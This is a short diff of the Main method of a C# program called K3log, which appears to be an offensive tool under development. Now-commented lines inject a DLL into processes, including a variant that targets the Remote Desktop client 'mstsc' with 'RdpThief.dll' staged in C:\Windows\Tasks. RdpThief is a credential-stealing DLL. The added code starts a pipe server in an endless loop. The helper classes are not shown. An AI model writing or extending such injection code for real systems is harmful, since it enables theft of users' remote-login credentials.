@@ -1,6 +1,4 @@
 ﻿using System;
-using System.Threading.Tasks;
-using System.Windows.Forms;
 
 namespace K3log
 {
@@ -10,14 +8,32 @@ namespace K3log
 		
 		static void Main(String[] args)
 		{
+
+
 			// init string collection
+			//
 			//StringsCollector strc = new StringsCollector();
 			//strc.startCollector();
 
+
+
 			///DLL injection
-			InDinLib dllinj = new InDinLib();
-			dllinj.startInj(Int32.Parse(args[0]), args[1]);
+			///
+			//InDinLib dllinj = new InDinLib();
+			//string procName = "mstsc";
+			//string dllpath = "C:\\Windows\\Tasks\\RdpThief.dll";
+			//dllinj.monitorProcAndInj(procName, dllpath);
+
+
+			//Pipe server
+
+			pipeServer ps = new pipeServer();
+			ps.StartServer();
+
+			while (true) { 
 			
+			
+			}
 		}
 	}
 }
